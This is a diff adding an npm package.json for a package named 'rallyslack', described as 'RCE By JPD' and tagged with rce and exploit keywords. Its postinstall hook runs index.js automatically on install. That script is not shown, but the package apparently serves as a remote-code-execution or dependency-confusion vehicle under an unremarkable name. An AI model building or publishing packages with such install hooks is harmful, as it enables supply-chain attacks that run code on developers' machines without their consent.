@@ -1,0 +1,26 @@
+{
+  "name": "rallyslack",
+  "version": "1.0.0",
+  "description": "RCE By JPD",
+  "license": "ISC",
+  "author": "JPD",
+  "type": "commonjs",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node index.js",
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "keywords": ["rce", "security", "exploit", "vulnerability"],
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/JPD-12/rallyslack.git"
+  },
+  "bugs": {
+    "url": "https://github.com/JPD-12/rallyslack/issues"
+  },
+  "homepage": "https://github.com/JPD-12/rallyslack#readme",
+  "engines": {
+    "node": ">=14.0.0"
+  }
+}
+
